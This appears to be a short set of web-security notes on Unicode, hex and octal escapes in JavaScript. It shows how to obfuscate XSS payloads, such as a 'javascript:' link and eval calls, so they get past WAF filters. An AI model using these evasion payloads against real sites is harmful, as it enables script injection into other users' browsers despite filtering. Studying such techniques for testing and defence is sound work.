# Unicode


Unicode escape sequences consist of the prefix \u followed by the four-digit hex code for the character.

`\u003a` represents a colon.

ES6 also supports a new form of unicode escape using curly braces: `\u{3a}`

It's also worth noting that the ES6-style unicode escapes also allow optional leading zeros, so some WAFs may be easily fooled using the same technique we used for HTML encodings.

For example: `<a href="javascript:\u{00000000061}alert(1)">Click me</a>`

Obfuscation via hex escaping
eval("\x61lert")

Obfuscation via octal escaping
eval("\141lert(1)")

Obfuscation via multiple encodings

`<a href="javascript:&bsol;u0061lert(1)">Click me</a>` (Note: `&bsol;,` is `\`)

This is then decoded further to form a functioning XSS payload:
`<a href="javascript:alert(1)">Click me</a>`




- Examples:
    Leftwards Arrow U+2190 ←
    Upwards Arrow U+2191 ↑
    Rightwards Arrow U+2192 →
    Downwards Arrow U+2193 ↓
	




